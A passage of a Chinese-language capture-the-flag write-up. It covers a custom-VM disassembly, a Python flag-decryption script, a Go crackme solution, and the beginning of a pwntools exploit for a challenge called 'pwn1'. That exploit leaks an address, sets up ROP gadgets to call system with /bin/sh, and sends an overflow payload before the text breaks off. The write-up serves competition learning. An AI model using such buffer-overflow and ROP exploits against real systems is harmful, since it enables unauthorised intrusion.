+<span style="color:#960050;background-color:#1e0010">660:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r1</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">664:</span>   <span style="color:#a6e22e">mov</span>      <span style="color:#66d9ef">r0</span>,<span style="color:#ae81ff">4096</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">668:</span>   <span style="color:#a6e22e">mov</span>      <span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">912</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">672:</span>   <span style="color:#a6e22e">mov</span>      <span style="color:#66d9ef">r2</span>,<span style="color:#ae81ff">64</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">676:</span>   <span style="color:#a6e22e">call</span> <span style="color:#ae81ff">112</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">680:</span>   <span style="color:#a6e22e">sub</span>      <span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">684:</span>   <span style="color:#a6e22e">jmp</span>      <span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">688:</span>   <span style="color:#a6e22e">mov</span>      <span style="color:#66d9ef">r0</span>,<span style="color:#ae81ff">884</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">692:</span>   <span style="color:#a6e22e">jmp</span>      <span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">696:</span>   <span style="color:#a6e22e">mov</span>      <span style="color:#66d9ef">r0</span>,<span style="color:#ae81ff">894</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">700:</span>   <span style="color:#a6e22e">call</span> <span style="color:#ae81ff">44</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">704:</span>   <span style="color:#a6e22e">io</span>       <span style="color:#ae81ff">2</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">708:</span>   <span style="color:#a6e22e">mov</span>      <span style="color:#66d9ef">r6</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r0</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">712:</span>   <span style="color:#a6e22e">mov</span>      <span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r0</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">716:</span>   <span style="color:#a6e22e">io</span>       <span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">720:</span>   <span style="color:#a6e22e">sub</span>      <span style="color:#66d9ef">r1</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">724:</span>   <span style="color:#a6e22e">jmp</span>      <span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">728:</span>   <span style="color:#a6e22e">sub</span>      <span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r6</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">732:</span>   <span style="color:#a6e22e">ret</span>      <span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r0</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">736:</span>   <span style="color:#a6e22e">st</span>       <span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r6</span>,<span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">740:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r6</span>,<span style="color:#66d9ef">r6</span>,<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">744:</span>   <span style="color:#a6e22e">jmp</span>      <span style="color:#ae81ff">65504</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">748:</span>   <span style="color:#a6e22e">mov</span>      <span style="color:#66d9ef">r6</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r0</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">752:</span>   <span style="color:#a6e22e">ld</span>       <span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r6</span>,<span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">756:</span>   <span style="color:#a6e22e">rsh</span>      <span style="color:#66d9ef">r1</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">760:</span>   <span style="color:#a6e22e">lsh</span>      <span style="color:#66d9ef">r1</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">764:</span>   <span style="color:#a6e22e">sub</span>      <span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r1</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">768:</span>   <span style="color:#a6e22e">sub</span>      <span style="color:#66d9ef">r1</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">772:</span>   <span style="color:#a6e22e">jmp</span>      <span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">776:</span>   <span style="color:#a6e22e">ret</span>      <span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r0</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">780:</span>   <span style="color:#a6e22e">io</span>       <span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">784:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r6</span>,<span style="color:#66d9ef">r6</span>,<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">788:</span>   <span style="color:#a6e22e">jmp</span>      <span style="color:#ae81ff">65496</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">792:</span>   <span style="color:#a6e22e">mov</span>      <span style="color:#66d9ef">r3</span>,<span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">796:</span>   <span style="color:#a6e22e">jmp</span>      <span style="color:#ae81ff">44</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">800:</span>   <span style="color:#a6e22e">ld</span>       <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r3</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">804:</span>   <span style="color:#a6e22e">rsh</span>      <span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r4</span>,<span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">808:</span>   <span style="color:#a6e22e">lsh</span>      <span style="color:#66d9ef">r6</span>,<span style="color:#66d9ef">r5</span>,<span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">812:</span>   <span style="color:#a6e22e">sub</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r6</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">816:</span>   <span style="color:#a6e22e">ld</span>       <span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r1</span>,<span style="color:#66d9ef">r3</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">820:</span>   <span style="color:#a6e22e">rsh</span>      <span style="color:#66d9ef">r6</span>,<span style="color:#66d9ef">r5</span>,<span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">824:</span>   <span style="color:#a6e22e">lsh</span>      <span style="color:#66d9ef">r7</span>,<span style="color:#66d9ef">r6</span>,<span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">828:</span>   <span style="color:#a6e22e">sub</span>      <span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r5</span>,<span style="color:#66d9ef">r7</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">832:</span>   <span style="color:#a6e22e">sub</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r5</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">836:</span>   <span style="color:#a6e22e">jmp</span>      <span style="color:#ae81ff">12</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">840:</span>   <span style="color:#a6e22e">add</span>      <span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r3</span>,<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">844:</span>   <span style="color:#a6e22e">sub</span>      <span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r3</span>,<span style="color:#66d9ef">r2</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">848:</span>   <span style="color:#a6e22e">jmp</span>      <span style="color:#ae81ff">65484</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">852:</span>   <span style="color:#a6e22e">mov</span>      <span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r4</span>,<span style="color:#66d9ef">r0</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">856:</span>   <span style="color:#a6e22e">ret</span>      <span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r0</span>,<span style="color:#66d9ef">r0</span><span style="color:#960050;background-color:#1e0010">​</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ror</span>(a,b):<span style="color:#960050;background-color:#1e0010">​</span>
+    <span style="color:#66d9ef">return</span> (a<span style="color:#f92672">&gt;&gt;</span>b)<span style="color:#f92672">|</span>((a<span style="color:#f92672">&lt;&lt;</span>(<span style="color:#ae81ff">32</span><span style="color:#f92672">-</span>b))<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffffffff</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rol</span>(a,b):<span style="color:#960050;background-color:#1e0010">​</span>
+    <span style="color:#66d9ef">return</span> ((a<span style="color:#f92672">&lt;&lt;</span>b)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffffffff</span>)<span style="color:#f92672">|</span>(a<span style="color:#f92672">&gt;&gt;</span>(<span style="color:#ae81ff">32</span><span style="color:#f92672">-</span>b))<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+enc<span style="color:#f92672">=</span>open(<span style="color:#e6db74">&#39;code&#39;</span>,<span style="color:#e6db74">&#39;rb&#39;</span>)<span style="color:#f92672">.</span>read()[<span style="color:#ae81ff">0x390</span>:<span style="color:#ae81ff">0x3d0</span>]<span style="color:#960050;background-color:#1e0010">​</span>
+enc<span style="color:#f92672">=</span>[int<span style="color:#f92672">.</span>from_bytes(enc[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>],<span style="color:#e6db74">&#39;little&#39;</span>) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">64</span>,<span style="color:#ae81ff">4</span>)]<span style="color:#960050;background-color:#1e0010">​</span>
+enc[<span style="color:#ae81ff">15</span>]<span style="color:#f92672">+=</span>ror(enc[<span style="color:#ae81ff">13</span>],<span style="color:#ae81ff">1</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):<span style="color:#960050;background-color:#1e0010">​</span>
+    enc[i]<span style="color:#f92672">&amp;=</span><span style="color:#ae81ff">0xffffffff</span><span style="color:#960050;background-color:#1e0010">​</span>
+enc[<span style="color:#ae81ff">14</span>]<span style="color:#f92672">-=</span>rol(enc[<span style="color:#ae81ff">11</span>],<span style="color:#ae81ff">1</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):<span style="color:#960050;background-color:#1e0010">​</span>
+    enc[i]<span style="color:#f92672">&amp;=</span><span style="color:#ae81ff">0xffffffff</span><span style="color:#960050;background-color:#1e0010">​</span>
+enc[<span style="color:#ae81ff">13</span>]<span style="color:#f92672">+=</span>ror(enc[<span style="color:#ae81ff">8</span>],<span style="color:#ae81ff">8</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):<span style="color:#960050;background-color:#1e0010">​</span>
+    enc[i]<span style="color:#f92672">&amp;=</span><span style="color:#ae81ff">0xffffffff</span><span style="color:#960050;background-color:#1e0010">​</span>
+enc[<span style="color:#ae81ff">12</span>]<span style="color:#f92672">+=</span>ror(enc[<span style="color:#ae81ff">4</span>],<span style="color:#ae81ff">15</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):<span style="color:#960050;background-color:#1e0010">​</span>
+    enc[i]<span style="color:#f92672">&amp;=</span><span style="color:#ae81ff">0xffffffff</span><span style="color:#960050;background-color:#1e0010">​</span>
+enc[<span style="color:#ae81ff">11</span>]<span style="color:#f92672">-=</span>rol(enc[<span style="color:#ae81ff">12</span>],<span style="color:#ae81ff">6</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):<span style="color:#960050;background-color:#1e0010">​</span>
+    enc[i]<span style="color:#f92672">&amp;=</span><span style="color:#ae81ff">0xffffffff</span><span style="color:#960050;background-color:#1e0010">​</span>
+enc[<span style="color:#ae81ff">10</span>]<span style="color:#f92672">+=</span>ror(enc[<span style="color:#ae81ff">11</span>],<span style="color:#ae81ff">10</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):<span style="color:#960050;background-color:#1e0010">​</span>
+    enc[i]<span style="color:#f92672">&amp;=</span><span style="color:#ae81ff">0xffffffff</span><span style="color:#960050;background-color:#1e0010">​</span>
+enc[<span style="color:#ae81ff">9</span>]<span style="color:#f92672">+=</span>ror(enc[<span style="color:#ae81ff">14</span>],<span style="color:#ae81ff">11</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):<span style="color:#960050;background-color:#1e0010">​</span>
+    enc[i]<span style="color:#f92672">&amp;=</span><span style="color:#ae81ff">0xffffffff</span><span style="color:#960050;background-color:#1e0010">​</span>
+enc[<span style="color:#ae81ff">8</span>]<span style="color:#f92672">+=</span>ror(enc[<span style="color:#ae81ff">15</span>],<span style="color:#ae81ff">1</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):<span style="color:#960050;background-color:#1e0010">​</span>
+    enc[i]<span style="color:#f92672">&amp;=</span><span style="color:#ae81ff">0xffffffff</span><span style="color:#960050;background-color:#1e0010">​</span>
+enc[<span style="color:#ae81ff">7</span>]<span style="color:#f92672">-=</span>rol(enc[<span style="color:#ae81ff">9</span>],<span style="color:#ae81ff">12</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):<span style="color:#960050;background-color:#1e0010">​</span>
+    enc[i]<span style="color:#f92672">&amp;=</span><span style="color:#ae81ff">0xffffffff</span><span style="color:#960050;background-color:#1e0010">​</span>
+enc[<span style="color:#ae81ff">6</span>]<span style="color:#f92672">+=</span>ror(enc[<span style="color:#ae81ff">8</span>],<span style="color:#ae81ff">2</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):<span style="color:#960050;background-color:#1e0010">​</span>
+    enc[i]<span style="color:#f92672">&amp;=</span><span style="color:#ae81ff">0xffffffff</span><span style="color:#960050;background-color:#1e0010">​</span>
+enc[<span style="color:#ae81ff">5</span>]<span style="color:#f92672">+=</span>ror(enc[<span style="color:#ae81ff">15</span>],<span style="color:#ae81ff">9</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):<span style="color:#960050;background-color:#1e0010">​</span>
+    enc[i]<span style="color:#f92672">&amp;=</span><span style="color:#ae81ff">0xffffffff</span><span style="color:#960050;background-color:#1e0010">​</span>
+enc[<span style="color:#ae81ff">4</span>]<span style="color:#f92672">-=</span>rol(enc[<span style="color:#ae81ff">8</span>],<span style="color:#ae81ff">10</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):<span style="color:#960050;background-color:#1e0010">​</span>
+    enc[i]<span style="color:#f92672">&amp;=</span><span style="color:#ae81ff">0xffffffff</span><span style="color:#960050;background-color:#1e0010">​</span>
+enc[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">-=</span>rol(enc[<span style="color:#ae81ff">4</span>],<span style="color:#ae81ff">3</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):<span style="color:#960050;background-color:#1e0010">​</span>
+    enc[i]<span style="color:#f92672">&amp;=</span><span style="color:#ae81ff">0xffffffff</span><span style="color:#960050;background-color:#1e0010">​</span>
+enc[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">-=</span>rol(enc[<span style="color:#ae81ff">12</span>],<span style="color:#ae81ff">5</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):<span style="color:#960050;background-color:#1e0010">​</span>
+    enc[i]<span style="color:#f92672">&amp;=</span><span style="color:#ae81ff">0xffffffff</span><span style="color:#960050;background-color:#1e0010">​</span>
+enc[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">-=</span>rol(enc[<span style="color:#ae81ff">9</span>],<span style="color:#ae81ff">4</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):<span style="color:#960050;background-color:#1e0010">​</span>
+    enc[i]<span style="color:#f92672">&amp;=</span><span style="color:#ae81ff">0xffffffff</span><span style="color:#960050;background-color:#1e0010">​</span>
+enc[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">+=</span>ror(enc[<span style="color:#ae81ff">6</span>],<span style="color:#ae81ff">6</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):<span style="color:#960050;background-color:#1e0010">​</span>
+    enc[i]<span style="color:#f92672">&amp;=</span><span style="color:#ae81ff">0xffffffff</span><span style="color:#960050;background-color:#1e0010">​</span>
+print(list(map(hex,enc)))<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#f92672">from</span> libnum <span style="color:#f92672">import</span> n2s<span style="color:#960050;background-color:#1e0010">​</span>
+print(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(list(map(n2s,enc))))<span style="color:#960050;background-color:#1e0010">​</span>
+k <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;}ll4c_7c3r1dn1_dn4_hcn4rb_7c3r1dn1_h71w_mv{galf&#34;</span>[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#960050;background-color:#1e0010">​</span>
+print(k)<span style="color:#960050;background-color:#1e0010">​</span>
+s<span style="color:#f92672">=</span>[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">*</span><span style="color:#ae81ff">20</span><span style="color:#960050;background-color:#1e0010">​</span>
+i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#75715e"># s[0]-=s[6]&gt;&gt;&gt;6​</span>
+<span style="color:#75715e"># s[1]+=s[9]&lt;&lt;&lt;4​</span>
+<span style="color:#75715e"># s[2]+=s[12]&lt;&lt;&lt;5​</span>
+<span style="color:#75715e"># s[3]+=s[4]&lt;&lt;&lt;3​</span>
+<span style="color:#75715e"># s[4]+=s[8]&lt;&lt;&lt;10​</span>
+<span style="color:#75715e"># s[5]-=s[15]&gt;&gt;&gt;9​</span>
+<span style="color:#75715e"># s[6]-=s[8]&gt;&gt;&gt;2​</span>
+<span style="color:#75715e"># s[7]+=s[9]&lt;&lt;&lt;12​</span>
+<span style="color:#75715e"># s[8]-=s[15]&gt;&gt;&gt;1​</span>
+<span style="color:#75715e"># s[9]-=s[14]&gt;&gt;&gt;11​</span>
+<span style="color:#75715e"># s[10]-=s[11]&gt;&gt;&gt;10​</span>
+<span style="color:#75715e"># s[11]+=s[12]&lt;&lt;&lt;6​</span>
+<span style="color:#75715e"># s[12]-=s[4]&gt;&gt;&gt;15​</span>
+<span style="color:#75715e"># s[13]-=s[8]&gt;&gt;&gt;8​</span>
+<span style="color:#75715e"># s[14]+=s[11]&lt;&lt;&lt;1​</span>
+<span style="color:#75715e"># s[15]-=s[13]&gt;&gt;&gt;1</span>
+</code></pre></div><h3 id="comeongo">comeongo</h3>
+<p>动态调试分析代码即可知道，源代码分为两处check：maincheck1和maincheck2，第一处check将用户名前八字节和密码前八字节进行base58，即main_runtime_Encoding函数​
+<figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 142; 
+			flex-basis: 341px"
+	>
+	<a href="/post/qwnt-writeup-by-or4nge/re3.png" data-size="1116x785">
+		<img src="/post/qwnt-writeup-by-or4nge/re3.png"
+			width="1116"
+			height="785"
+			srcset="/post/qwnt-writeup-by-or4nge/re3_hu79a33d801d7d3aff9e74a5968590e5ca_86144_480x0_resize_box_3.png 480w, /post/qwnt-writeup-by-or4nge/re3_hu79a33d801d7d3aff9e74a5968590e5ca_86144_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure>
+main_check2首先将用户名8~12字节+字符‘vG’+密码10~12字节拼接做base64，即main_Encoding函数​,再做一些字符ascii值加减，即main_encryptBytes函数，最后比较​
+提取对应字符​</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">user<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;GoM0bi13&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;_BingGo@&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
+psw<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;G3tItEzF&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;orRevG0!&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
+print(user)<span style="color:#960050;background-color:#1e0010">​</span>
+print(psw)
+</code></pre></div><p>输入验证​,然后求出md5即可​</p>
+<h2 id="mimic">Mimic</h2>
+<h3 id="pwn1">pwn1</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#75715e"># context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;, &#39;-F&#39;, &#39;#{pane_pid}&#39;, &#39;-P&#39;]​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./pwn1&#39;</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+getshell_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0A00</span><span style="color:#960050;background-color:#1e0010">​</span>
+func_func_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0A94</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+pop_rdi_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xc73</span><span style="color:#960050;background-color:#1e0010">​</span>
+call_system <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xa2c</span><span style="color:#960050;background-color:#1e0010">​</span>
+binsh_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x202068</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;try something</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;some tricks</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+func_addr <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()<span style="color:#960050;background-color:#1e0010">​</span>
+func_addr <span style="color:#f92672">=</span> int(func_addr<span style="color:#f92672">.</span>strip(), <span style="color:#ae81ff">16</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+print (<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;func_addr: </span><span style="color:#e6db74">{</span>hex(func_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+base_addr <span style="color:#f92672">=</span> func_addr <span style="color:#f92672">-</span> func_func_addr<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;hello&#39;</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0xc8</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+p<span style="color:#f92672">.</span>recvline()<span style="color:#960050;background-color:#1e0010">​</span>
+p<span style="color:#f92672">.</span>recvline()<span style="color:#960050;background-color:#1e0010">​</span>
